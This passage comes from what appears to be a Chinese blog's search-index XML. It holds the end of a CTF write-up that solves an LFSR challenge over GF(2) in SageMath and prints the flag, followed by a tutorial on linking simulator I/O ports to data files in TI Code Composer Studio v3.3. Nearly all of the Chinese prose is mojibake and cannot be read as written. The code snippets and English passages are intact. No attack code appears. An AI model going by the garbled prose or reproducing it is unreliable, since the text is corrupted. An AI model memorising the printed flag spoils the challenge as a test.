punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>é¦–å…ˆæå–çº¿æ€§æ–¹ç¨‹<strong>ç³»æ•°çŸ©é˜µ F</strong> å’Œ<strong>è§£çŸ©é˜µ C</strong>ï¼Œè€Œååˆ©ç”¨ <strong>SageMath</strong> æ±‚è§£æ–¹ç¨‹å³å¯ã€‚</p><p>å…¶ä¸­çš„ <code>GF(2)</code>ï¼ŒGF æ˜¯ Galois Field çš„ç¼©å†™ï¼Œä¸­æ–‡ç§°å…¶ä¸º GaloisåŸŸæˆ–æœ‰é™åŸŸï¼Œ <code>GF(2)</code>æ˜¯æœ€ç®€å•çš„æœ‰é™åŸŸï¼Œåªæœ‰0, 1äºŒå…ƒåŠ+ï¼ˆå¼‚æˆ–è¿ç®—ï¼‰ã€Ã—ï¼ˆä¸è¿ç®—ï¼‰ï¼Œå¤§æ¦‚å¯ä»¥ç†è§£ä¸ºæ¨¡äºŒè¿ç®—å§ã€‚</p><p>åœ¨çº¿ SageMathï¼š <a href="https://cocalc.com/">https://cocalc.com/</a></p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/image-20200821163107265.png" alt="SageMath"></p><p><code>flag{856137228707110492246853478448}</code></p><hr><h2 id="SageMath-Introduction"><a href="#SageMath-Introduction" class="headerlink" title="SageMath Introduction"></a>SageMath Introduction</h2><p>è¿™é‡Œé¡ºä¾¿æ¥ä»‹ç»ä¸€ä¸‹ SageMath è¿™ä¸€å·¥å…·å–µï¼</p><blockquote><p><strong>SageMath</strong> is a free open-source mathematics software system licensed under the GPL. It builds on top of many existing open-source packages: NumPy, SciPy, matplotlib, Sympy, Maxima, GAP, FLINT, R and many more. Access their combined power through a common, Python-based language or directly via interfaces or wrappers.</p><p>Mission: <em>Creating a viable free open source alternative to Magma, Maple, Mathematica and Matlab.</em></p></blockquote><p><strong>SageMath</strong> æ˜¯ä¸€ä¸ªåŸºäº GPL åè®®çš„å¼€æºæ•°å­¦è½¯ä»¶ã€‚å®ƒ<strong>ä½¿ç”¨ <em>Python</em> ä½œä¸ºé€šç”¨æ¥å£</strong>ï¼Œå°†ç°æœ‰çš„è®¸å¤šå¼€æºè½¯ä»¶åŒ…æ•´åˆåœ¨ä¸€èµ·ï¼Œæ„å»ºä¸€ä¸ªç»Ÿä¸€çš„è®¡ç®—å¹³å°ã€‚</p><p>ä¸€ä¸ªæ•°å­¦æ±‚è§£è½¯ä»¶ï¼Œå¯ä»¥è§£æ–¹ç¨‹å•Š balabalaï¼Œæ„Ÿè§‰ç”¨èµ·æ¥æŒºçˆ½çš„ã€‚  </p><p><strong>å®˜ç½‘ï¼š</strong> <a href="https://www.sagemath.org/">https://www.sagemath.org/</a></p><p><strong>åœ¨çº¿ç‰ˆæœ¬ï¼š</strong> <a href="https://cocalc.com/">https://cocalc.com/</a></p><p><a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p><br><p>By the wayï¼Œè¿™ä¸ª <a href="https://cocalc.com/"><strong>CoCalc</strong></a> èƒ½åšçš„ä¸ä»…ä»…å¯ä»¥ç”¨æ¥è·‘ SageMathï¼Œè¿˜æœ‰ Jupyter notebook, Linux terminal, X11 desktop, LaTeX document ç­‰ç­‰ï¼Œåœ¨çº¿å…è´¹ç”¨ï¼Œç™»å½•è¿˜èƒ½ä¿å­˜å·¥ä½œçŠ¶æ€ï¼Œæ„Ÿè§‰æŒºå®ç”¨çš„å‘¢ã€‚</p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/image-20200830023940598.png" alt="CoCalc"></p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/image-20200830025835167.png" alt="CoCalc2"></p><hr><h2 id="References-amp-Extensive-Reading"><a href="#References-amp-Extensive-Reading" class="headerlink" title="References &amp; Extensive Reading"></a>References &amp; Extensive Reading</h2><ul><li><a href="https://www.freebuf.com/articles/database/170814.html">Z3Pyåœ¨CTFé€†å‘ä¸­çš„è¿ç”¨</a></li><li><a href="https://blog.csdn.net/qq_33438733/article/details/82011892">Z3 å­¦ä¹ ç¬”è®°</a></li><li><a href="https://xz.aliyun.com/t/3682">CTF ä¸­çš„ LFSR</a> </li><li><a href="https://www.anquanke.com/post/id/181811">æ·±å…¥åˆ†æCTFä¸­çš„LFSRç±»é¢˜ç›®ï¼ˆä¸€ï¼‰</a></li><li><a href="https://www.anquanke.com/post/id/184828">æ·±å…¥åˆ†æCTFä¸­çš„LFSRç±»é¢˜ç›®ï¼ˆäºŒï¼‰</a></li><li>etc.</li></ul><p>ï¼ˆå…ˆæºœäº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSP | CCS v3.3 åˆ©ç”¨I/Oç«¯å£ä»å¤–éƒ¨æ–‡ä»¶ä¼ é€æ•°æ®çš„ç›¸å…³é…ç½®</title>
      <link href="2020/07/11/Tips_CCS_RWDataFromPort/"/>
      <url>2020/07/11/Tips_CCS_RWDataFromPort/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å–µå‘œï¼Œä¸çŸ¥ä¸è§‰æœ‰ä¸€ä¸ªå¤šæœˆæ²¡æ¥å†™ä¸œè¥¿äº†ï¼ˆæ‘Šæ‰‹</p><p>è€ƒè¯•æœˆä¹Ÿå¤ªéš¾ç†¬äº†å§**<em>ï¼ˆå¤´ç§ƒ.gifï¼‰**</em>ï¼<strong>å•Šå•Šå•Šç»ˆäºè¿‡æ¥äº†ï¼</strong></p><p>æ¯ä¸ªæœŸæœ«éƒ½å¾ˆéš¾è¿‡ï¼Œä½†è¿™ä¸ªæœŸæœ«æ€•æ˜¯æœ€éš¾å—æœ€ç„¦è™‘çš„ä¸€ä¸ªäº†ï¼Œä¸»è¦æ˜¯ä¸€å †äº‹æƒ…å…¨å †åˆ°äº†è€ƒè¯•æœˆç”šè‡³æœ€åçš„æ‰å †è€ƒè¯•å‘¨ã€‚äº”é—¨çº¿ä¸Šè€ƒè¯•æœ‰å››é—¨æ˜¯ä¸¤é—¨ä¸¤é—¨è¿ç€è€ƒçš„ï¼ŒæœŸé—´è¿˜æœ‰å„ç§è¯¾ç¨‹çš„å®éªŒï¼ˆåŠå®éªŒæŠ¥å‘Šï¼‰ã€å¤§ä½œä¸šï¼ˆåŠå…¶æŠ¥å‘Šï¼‰ã€ç»“è¯¾æŠ¥å‘Šã€ç½‘è¯¾è€ƒè¯•ï¼Œä»¥åŠé›¶é›¶æ•£æ•£çš„æ‚äº‹ balabalaã€‚è€ƒå‰èµ¶ç€ ddl ä¸€å¤©å†™äº†ä¸¤ç¯‡åŠæŠ¥å‘Šï¼Œç„¶åæŒ¤ç€æ—¶é—´ç–¯ç‹‚ <del>å¤</del> é¢„ä¹ è€ƒè¯•è¯¾ç¨‹ï¼Œäººéƒ½è¦æ²¡äº†â€¦â€¦</p><p>è¿™å­¦æœŸé€‰äº†ä¸€é—¨ <strong>DSP åŸç†ä¸åº”ç”¨</strong> é€‰ä¿®è¯¾ï¼Œäº²èº«æ„Ÿå—è¯æ˜è¿™é—¨è¯¾å¤ªéš¾äº†ï¼Œå”‰ï¼Œ<del>åæ‚”æ²¡é€€æ‰å“­å”§å”§ã€‚</del> è¿™ä¸ªå¤§ä½œä¸šå¤ªéš¾åšäº†å‘€ï¼ä¹‹å‰æŠ˜è…¾äº†å¥½ä¹…åšä¸å‡ºæ¥ï¼Œæ‹–ç€æ‹–ç€å°±æœ‰ç‚¹ä½›ç³»äº†ï¼ˆï¼ˆ</p><p>åšè¿™ä¸ª DSP å¤§ä½œä¸šéœ€è¦ç”¨åˆ° CCS è½¯ä»¶ï¼Œå°±æ˜¯è¾£ä¸ª TI å‡ºçš„ <a href="https://www.ti.com.cn/tool/cn/CCSTUDIO">Code Composer Studio é›†æˆå¼€å‘ç¯å¢ƒ (IDE)</a>ï¼Œç„¶è€Œæ˜¯ç”¨<strong>å¤è€çš„ v3.3 ç‰ˆæœ¬ï¼</strong>æ®è€å¸ˆæ˜¯å› ä¸ºç”¨åˆ°çš„æ˜¯ DSP å‹å·ä¸º TMS320C54x ç³»åˆ—ï¼Œè€Œè¿™ä¸ªç³»åˆ—åªæœ‰åœ¨è¿™ä¸€ç‰ˆæœ¬ä¸Šæ‰æœ‰æ”¯æŒã€‚å•Šæ˜¯æŒºå¤è€çš„äº†ã€‚</p><p>å»å®˜ç½‘çœ‹äº†çœ‹ï¼Œç°åœ¨æœ€æ–°çš„æ˜¯ 11 Jun 2020 å‘å¸ƒçš„ 10.1.0.00010ã€‚</p><p>åˆå»ç¿»äº†ç¿» <a href="http://software-dl.ti.com/ccs/esd/documents/ccs_downloads.html">CCS ç‰ˆæœ¬å†å²é¡µé¢</a>ï¼Œæ‹‰åˆ°æœ€ä¸‹é¢æ‰æ‰¾åˆ°äº† V3.3 ç‰ˆæœ¬ï¼Œä½›äº†ï¼ŒCCSv4.0.xæ˜¯2009å¹´å‘å¸ƒçš„ï¼Œé‚£ v3.3 å²‚ä¸æ˜¯æ›´å¤è€â€¦â€¦</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712002124213.png" alt="Version3"></p><p>æ®è¯´è¿™ä¸ªè½¯ä»¶åªæ”¯æŒ 32 ä½æ“ä½œç³»ç»Ÿï¼Œäºæ˜¯å…ˆåœ¨è™šæ‹Ÿæœºé‡Œæ•´äº†ä¸ª Windows 7 32bit ç³»ç»Ÿï¼Œç„¶åæ‰è£…ä¸Šè¿™å¤è‘£ emmmã€‚</p><p>è€Œå¯¹äº<strong>åˆ©ç”¨ Simulator çš„ I/O ç«¯å£ä»å¤–éƒ¨æ–‡ä»¶ä¼ é€æ•°æ®çš„æ–¹æ³•</strong>ï¼ŒæŸ¥äº†å„ç§èµ„æ–™å‡ ä¹æ²¡æœ‰ç›¸å…³ä»‹ç»ï¼Œæœ€åæ˜¯åœ¨è€å¸ˆå’Œå°ä¼™ä¼´çš„æŒ‡å¯¼å’Œæç¤ºä¸‹ï¼Œæ‰å®ç°äº†è¿™ä¸€æ“ä½œã€‚</p><p>é‚£æ­£å¥½å°±æ¥è®°å½•ä¸€ä¸‹å§ï¼Œå¸Œæœ›å¯¹å­¦å¼Ÿå­¦å¦¹ä»¬æœ‰ç‚¹å¸®åŠ©<em>ï¼ˆå¦‚æœçœ‹åˆ°çš„è¯ï¼‰</em>ï¼Œä¹Ÿå¯¹æƒ³è¦ä»äº‹ç›¸å…³ç ”ç©¶çš„è¯»è€…æœ‰æ‰€å¯å‘ã€‚</p><hr><br><h2 id="æ–¹æ³•ä»‹ç»"><a href="#æ–¹æ³•ä»‹ç»" class="headerlink" title="æ–¹æ³•ä»‹ç»"></a>æ–¹æ³•ä»‹ç»</h2><p>å†æ‰¯å‡ å¥å§ã€‚é¦–å…ˆæ˜¯æŠŠæ•™æä¸Šå…³äº CCS ä½¿ç”¨çš„ä»‹ç»è¿‡äº†ä¸€éã€‚</p><p>æ•™æç¬¬ä¸‰ç‰ˆï¼šbalabala è¯¦è§ 4.7.3 å°èŠ‚ï¼Œç„¶è€Œå¹¶æ²¡æœ‰è¿™ä¸€èŠ‚ï¼ˆä¼°è®¡å†ç‰ˆçš„æ—¶å€™æ²¡æ”¹ï¼‰ã€‚</p><p>ç¿»å‡ºç¬¬ä¸€ç‰ˆç”µå­ç‰ˆï¼Œå‚»äº†ï¼Œ2001å¹´çš„ç‰ˆæœ¬ï¼Œé‚£æ—¶å€™è¿˜æ²¡ç”¨ CCSï¼Œæ˜¯ç”¨å‘½ä»¤è¡Œæ¨¡æ‹Ÿçš„â€¦â€¦</p><p>ç½‘ä¸Šæ‰¾äº†å„ç§èµ„æ–™ï¼Œä¹Ÿæ²¡å…·ä½“ä»‹ç»ï¼Œè¦ä¸ç„¶å°±æ˜¯åˆ©ç”¨ Cè¯­è¨€ï¼ˆè€Œä¸æ˜¯æ±‡ç¼–ï¼‰æ¥ç¼–å†™çš„ä»£ç ï¼Œè¿™ä¸ªå¯¼å…¥æ•°æ®çš„æ–¹æ³•åˆä¸ä¸€æ ·ï¼Œæ˜¯åœ¨Cè¯­è¨€ä¸­ç›¸åº”çš„è¯­å¥æ‰“ä¸Šæ–­ç‚¹ï¼Œè€Œåä¿®æ”¹æ–­ç‚¹çš„æ¡ä»¶ä¸ºè¯»å–/å†™å…¥æ•°æ®æ¥å®ç°çš„ã€‚</p><p>çœ‹äº†ä¸€éæš‘å‡è¦è¡¥åšçš„ DSP å®éªŒçš„æŒ‡å¯¼ä¹¦ï¼Œè²Œä¼¼ä»‹ç»çš„æ˜¯æ›´å¤è€çš„ CCS 2.x ç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬åˆä¸ä¸€æ ·ï¼Œè¯•äº†ä½†æ•°æ®å¹¶æ²¡æœ‰æˆåŠŸè¾“å…¥ï¼Œåˆæ€€ç–‘æ˜¯è¾“å…¥æ–‡ä»¶æ ¼å¼çš„é—®é¢˜ã€‚<br>â€¦â€¦</p><p>åˆ°äº†æœ€åï¼Œåœ¨å°ä¼™ä¼´æç¤ºä¸‹ï¼Œæ‰¾åˆ°äº†è€å¸ˆåœ¨ç¾¤é‡Œå‘çš„æ‹çš„å‡ é¡µè¯¾æœ¬ã€‚æ‰çŸ¥é“åŸæ¥æ˜¯ç¬¬äºŒç‰ˆè¯¾æœ¬çš„ 4.7.3 å°èŠ‚é‡Œåšäº†ä»‹ç»â€¦â€¦ï¼ˆå¤´ç§ƒ</p><p>å…¶å®å°±æ˜¯<strong>å°† I/O å£çš„åœ°å€ä¸å¤–éƒ¨çš„æ•°æ®æ–‡ä»¶ç›¸å…³è”</strong>ã€‚å‚è€ƒç¬¬äºŒç‰ˆè¯¾æœ¬ï¼Œå…·ä½“çš„å®ç°çš„æ­¥éª¤å¦‚ä¸‹ã€‚</p><h3 id="Step-1-ä¿®æ”¹-GEL-æ–‡ä»¶"><a href="#Step-1-ä¿®æ”¹-GEL-æ–‡ä»¶" class="headerlink" title="Step 1 ä¿®æ”¹ GEL æ–‡ä»¶"></a>Step 1 ä¿®æ”¹ GEL æ–‡ä»¶</h3><blockquote><p>CCS çš„ GEL è¯­è¨€ï¼ˆé€šç”¨æ‰©å±•è¯­è¨€ï¼‰æ˜¯ä¸€ç§äº¤äº’å¼çš„å‘½ä»¤ï¼Œå®ƒæ˜¯è§£é‡Šæ‰§è¡Œçš„ï¼Œå³ä¸èƒ½è¢«ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚å®ƒçš„ä½œç”¨åœ¨äºæ‰©å±•äº† CCS çš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨ GEL æ¥è°ƒç”¨ä¸€äº›èœå•å‘½ä»¤ï¼Œå¯¹DSPçš„å­˜å‚¨å™¨è¿›è¡Œåˆå§‹åŒ–é…ç½®ç­‰ã€‚ </p></blockquote><p>é€šè¿‡ä¿®æ”¹ GELæ–‡ä»¶ï¼Œ<strong>å®šä¹‰ I/O ç«¯å£åœ°å€æ˜ åƒ</strong>ã€‚</p><p>åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­<strong>å°†è¾“å‡ºç«¯å£ PA0 æ˜ å°„åˆ° 0x0000ï¼Œå°†è¾“å…¥ç«¯å£ PA1 æ˜ å°„åˆ° 0x0001</strong>ã€‚</p><p>å³åœ¨ <code>C5402_Init()</code> å‡½æ•°ä¸­åŠ å…¥ä¸‹é¢çš„è¯­å¥ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">GEL_MapAdd</span><span class="token punctuation">(</span><span class="token number">0x0001</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* I/O Read */</span><span class="token function">GEL_MapAdd</span><span class="token punctuation">(</span><span class="token number">0x0000</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* I/O Write */</span></code></pre><blockquote><p>å…·ä½“å«ä¹‰æ˜¯</p><p><strong>GEL_MapAdd(address, page, length, readable, writeable);</strong></p><p>address    ç«¯å£åœ°å€å€¼ã€‚</p><p>page    å­˜å‚¨ç©ºé—´å€¼ã€‚0ï¼šç¨‹åºç©ºé—´ï¼Œ1ï¼šæ•°æ®ç©ºé—´ï¼Œ2ï¼šI/O ç©ºé—´ã€‚</p><p>length    åœ°å€ç©ºé—´é•¿åº¦ã€‚å¯¹äº I/O ç«¯å£ä¸€èˆ¬å–ä¸º1ã€‚</p><p>readable    å¯è¯»æ ‡å¿—ã€‚1å¯è¯»ï¼Œ0ä¸å¯è¯»ã€‚</p><p>writeable    å¯å†™æ ‡å¿—ã€‚1å¯å†™ï¼Œ0ä¸å¯å†™ã€‚</p></blockquote><p>ä¿®æ”¹åçš„ç»“æœå¦‚å›¾æ‰€ç¤ºã€‚</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712011437886.png" alt="gel"></p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712003700513.png" alt="gel2"></p><h3 id="Step-2-Reload-GEL-File"><a href="#Step-2-Reload-GEL-File" class="headerlink" title="Step 2 Reload GEL File"></a>Step 2 Reload GEL File</h3><p>è¯·æ³¨æ„ï¼Œä¸€å®šè¦<strong>é‡æ–°åŠ è½½ GEL é…ç½®æ–‡ä»¶</strong>ï¼Œå¦åˆ™è¿™ä¸ªé…ç½®æ˜¯ä¸ç”Ÿæ•ˆçš„ã€‚<em>ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªæ‰å‘é‡Œçš„</em></p><p>å…·ä½“æ–¹æ³•å°±æ˜¯åœ¨å·¦è¾¹çš„æ–‡ä»¶åˆ—è¡¨é‡Œè¿™ä¸ª gel æ–‡ä»¶ä¸Šå³é”®ï¼Œç‚¹å‡» Reload å³å¯ã€‚</p><p>å½“ç„¶ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œé‚£å°±æ˜¯<strong>é‡å¯ CCS è½¯ä»¶</strong>ã€‚å®åœ¨ä¸è¡Œ<strong>é‡å¯ç³»ç»Ÿ</strong>ä¹Ÿè¡Œ 23333.</p><p>ï¼ˆé‡å¯è§£å†³ç»å¤§éƒ¨åˆ†é—®é¢˜å‘¢ï¼</p><h3 id="Step-3-Port-Connect"><a href="#Step-3-Port-Connect" class="headerlink" title="Step 3 Port Connect"></a>Step 3 Port Connect</h3><p>ç‚¹å‡»èœå•æ ä¸‹çš„ Tools - Port Connectã€‚å»ºç«‹ç«¯å£ä¸æ–‡ä»¶ä¹‹é—´çš„è¿æ¥ã€‚</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712005647785.png" alt="PortConnect"></p><p>ç«¯å£è®¾ç½®å¦‚ä¸‹ã€‚</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712005859001.png" alt="connect"></p><p><code>Port</code> å³åœ¨ Step 1 ä¸­è®¾ç½®çš„ç«¯å£ï¼Œ0x01 ä¸ºè¾“å…¥ç«¯å£ï¼Œ0x00 ä¸ºè¾“å‡ºç«¯å£ã€‚<code>Type</code>ä¹Ÿç›¸åº”è®¾ç½®ã€‚</p><p><code>Length</code> è®¾ç½®ä¸º1ã€‚</p><p><code>Page</code> è®¾ç½®ä¸º I/Oã€‚</p><p>ç‚¹å‡»<code>OK</code>ä¹‹åä¼šå¼¹å‡ºæ–‡ä»¶é€‰æ‹©çª—å£ï¼Œé€‰æ‹©ä½ è¦å¯¼å…¥/å¯¼å‡ºæ•°æ®çš„æ–‡ä»¶å³å¯å•¦ï¼</p><p>å™¢å¯¹äº†ï¼Œè¿™é‡Œæä¸€å¥ï¼Œè¿™ä¸ªæ–‡ä»¶çš„æ ¼å¼æ˜¯æ¯è¡Œä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°æ®ï¼Œæ•°æ®é•¿åº¦ä¸º16ä½ï¼Œä¸å¸¦å‰å¯¼ç¬¦<code>0x</code>ï¼Œå³å½¢å¼ä¸º <code>xxxx</code>ï¼Œ<code>x</code>ä¸º 0-F ä¹‹é—´çš„æ•°ã€‚ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712010628380.png" alt="file format"></p><p><strong>è¿™ä¸ªæ ¼å¼ä¸åˆ©ç”¨æ–­ç‚¹è¾“å…¥è¾“å‡ºæ•°æ®çš„æ ¼å¼ä¸åŒï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼</strong>ï¼ˆé‚£ä¸ªæ˜¯é¦–è¡Œæœ‰æ ¼å¼æ ‡è¯†çš„ï¼Œ1651 balabalaï¼‰</p><h3 id="Step-4-ç¡®è®¤è¿æ¥"><a href="#Step-4-ç¡®è®¤è¿æ¥" class="headerlink" title="Step 4 ç¡®è®¤è¿æ¥"></a>Step 4 ç¡®è®¤è¿æ¥</h3><p>åœ¨ä¸‹æ–¹ä¼šæœ‰ä¸€ä¸ªæ–°çš„çª—å£ï¼Œé…ç½®å¥½åçš„çŠ¶æ€å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712011153456.png" alt="port"></p><p>å¯ä»¥é€šè¿‡ Connect å’Œ Disconnect æŒ‰é’®æ¥å»ºç«‹/å–æ¶ˆç«¯å£è¿æ¥ã€‚</p><p>è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå†™å…¥çš„æ–‡ä»¶ï¼Œåœ¨æ–­å¼€è¿æ¥ä¹‹å‰ï¼Œéƒ½æ˜¯ä¸€ç›´è¢« CCS å ç”¨ç€çš„ï¼Œè€Œä¸”å¹¶æ²¡æœ‰å®æ—¶å†™å…¥æ–‡ä»¶ï¼</p><p>ï¼ˆç›²çŒœå¯èƒ½åœ¨è¾“å‡ºç¼“å­˜ä¸­ï¼Ÿå ç”¨äº†æ–‡ä»¶å¥æŸ„ä½†æ²¡æœ‰ flushï¼Ÿï¼‰</p><p>å› æ­¤è¦æƒ³çœ‹åˆ°ç»“æœçš„è¯ä¸€ç§æ–¹æ³•æ˜¯æ–­å¼€è¾“å‡ºæ–‡ä»¶ï¼Œå¦ä¸€ç§æ–¹æ³•ï¼Œå…³æ‰ CCSï¼ˆç®€å•ç²—æš´ã€‚</p><h3 id="Step-5-åœ¨æ±‡ç¼–ä¸­ä½¿ç”¨ç«¯å£"><a href="#Step-5-åœ¨æ±‡ç¼–ä¸­ä½¿ç”¨ç«¯å£" class="headerlink" title="Step 5 åœ¨æ±‡ç¼–ä¸­ä½¿ç”¨ç«¯å£"></a>Step 5 åœ¨æ±‡ç¼–ä¸­ä½¿ç”¨ç«¯å£</h3><p>é¦–å…ˆå®šä¹‰è¾“å…¥è¾“å‡ºç«¯å£å¦‚ä¸‹ã€‚</p><pre class="language-asm" data-language="asm"><code class="language-asm">PA0 .set 0 ;0å£ è¾“å‡º PA1 .set 1 ;1å£ è¾“å…¥</code></pre><p>è€Œåç»“åˆ PORTRã€PORTW ç­‰å‘½ä»¤ä½¿ç”¨ç«¯å£å³å¯ã€‚</p><pre class="language-asm" data-language="asm"><code class="language-asm">PORTR PA1,@xPORTW @y,PA0</code></pre><p>å¥½äº†ï¼Œå¤§æ¦‚å°±è¿™äº›äº†å–µ~</p><hr><h2 id="ä¸€ç§ç®€åŒ–æ–¹æ³•"><a href="#ä¸€ç§ç®€åŒ–æ–¹æ³•" class="headerlink" title="ä¸€ç§ç®€åŒ–æ–¹æ³•"></a>ä¸€ç§ç®€åŒ–æ–¹æ³•</h2><p>å™¢å¯¹äº†ï¼Œä¹¦ä¸Šè¿˜ç»™å‡ºäº†ä¸€ç§æ›¿ä»£æ–¹æ¡ˆï¼Œå¯ä»¥ç®€åŒ–å‰è¿°æ–¹æ³•çš„ Step 3.</p><p>å°±æ˜¯<strong>åœ¨ GEL æ–‡ä»¶åˆå§‹åŒ–å‡½æ•°ä¸­å†åŠ å…¥ä¸‹é¢çš„è¯­å¥</strong>ï¼Œç›´æ¥å»ºç«‹ç«¯å£çš„è¿æ¥ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">GEL_PortConnect</span><span class="token punctuation">(</span><span class="token number">0x0001</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token string">"C:\\ti\\C54x\\in.dat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">GEL_PortConnect</span><span class="token punctuation">(</span><span class="token number">0x0000</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token string">"C:\\ti\\C54x\\out.dat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>å…·ä½“å«ä¹‰æ˜¯</p><p><strong>GEL_PortConnect(portAddress, page, length, accessType, fileName);</strong></p><p>portAddress    ç«¯å£åœ°å€å€¼ã€‚</p><p>page    å­˜å‚¨ç©ºé—´å€¼ã€‚0ï¼šç¨‹åºç©ºé—´ï¼Œ1ï¼šæ•°æ®ç©ºé—´ï¼Œ2ï¼šI/O ç©ºé—´ã€‚</p><p>length    åœ°å€ç©ºé—´é•¿åº¦ã€‚å¯¹äº I/O ç«¯å£ä¸€èˆ¬å–ä¸º1ã€‚</p><p>accessType    å­˜å–ç±»å‹ã€‚1ä¸ºè¯»å–ï¼ˆè¾“å…¥ï¼‰ï¼Œ2ä¸ºå†™å…¥ï¼ˆè¾“å‡ºï¼‰ã€‚</p><p>fileName    å¤–éƒ¨æ•°æ®æ–‡ä»¶åã€‚æ³¨æ„æ˜¯ç»å¯¹åœ°å€ï¼Œç›®å½•è¦ç”¨åŒæ–œæ ã€‚</p></blockquote><p>ï¼ˆä¸è¿‡è¿™ä¸ªåŠæ³•æˆ‘ä¹Ÿæ²¡è¯•è¿‡ï¼Œä¸æ¸…æ¥šæ€ä¹ˆæ ·å–µ</p><p>ï¼ˆä¹Ÿå°±æ˜¯ç®€åŒ–äº†é‚£ä¸ªç«¯å£è¿æ¥çš„æ“ä½œè€Œå·²å•¦</p><hr><h2 id="å…¶ä»–ä¸€äº›-tips"><a href="#å…¶ä»–ä¸€äº›-tips" class="headerlink" title="å…¶ä»–ä¸€äº› tips"></a>å…¶ä»–ä¸€äº› tips</h2><p>ä¹Ÿç®—æ˜¯ç¢ç£¨å‡ºæ¥çš„/è°ƒæ•™å‡ºæ¥çš„ä¸€äº›ç»éªŒå§â€¦â€¦å¤´ç§ƒã€‚</p><ol><li><p>æ¯æ¬¡ä¿®æ”¹æ±‡ç¼–ç¨‹åºï¼ŒRebuild ä¹‹åï¼Œéƒ½è¦è®°å¾— Reload Programï¼ˆå½“ç„¶ç¬¬ä¸€æ¬¡è·‘ç¨‹åºçš„è¯å°±æ˜¯ Load Program äº†2333ï¼‰ï¼Œå°†è¾“å‡ºçš„ out æ–‡ä»¶åŠ è½½åˆ° Simulator ä¸­è¿›è¡Œä»¿çœŸè°ƒè¯•ã€‚</p></li><li><p>ç”»å›¾çš„æ—¶å€™ï¼Œæ¯è¿è¡Œå®Œä¸€éç¨‹åºï¼Œéƒ½è¦é‡æ–°å¯åŠ¨ï¼ˆRestartï¼‰ï¼Œä¸ç„¶å•¥ä¹Ÿæ²¡æœ‰å˜åŒ–ï¼Œæˆ–è€…ä¼šå‡ºç°å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æ˜¯ä»£ç è®¾è®¡ä¸Šçš„é—®é¢˜äº†ã€‚</p></li><li><p>ç”»å›¾çš„è¯å¿…é¡»è¦åœ¨åœä¸‹æ¥ï¼ˆhaltï¼‰çš„æ—¶å€™æ‰èƒ½ç»˜åˆ¶ï¼Œä¸ç„¶æ²¡å˜åŒ–ã€‚è¿™é‡Œå¯ä»¥åœ¨ç¨‹åºä¸­åŠ å…¥æ–­ç‚¹æ¥å®ç°ã€‚æˆ‘å»ºè®®çš„è¯è¿˜å¯ä»¥åœ¨è¾“å‡ºæ•°æ®çš„ä½ç½®æ‰“ä¸ªæ–­ç‚¹ï¼Œç„¶åé€‰é¡¹é€‰æ‹©æ›´æ–°æ‰€æœ‰çª—å£ï¼ˆUpdate all windowsï¼‰ï¼Œè¿˜æ˜¯å« Refresh Window æ¥ç€ï¼Œæ„Ÿè§‰ä¸Šæ˜¯æœ‰ç”¨çš„å¯è¡Œçš„ã€‚è€Œååœ¨æœ€åç¨‹åºç»“æŸæ­»å¾ªç¯é‚£é‡Œå†æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œè¿™æ 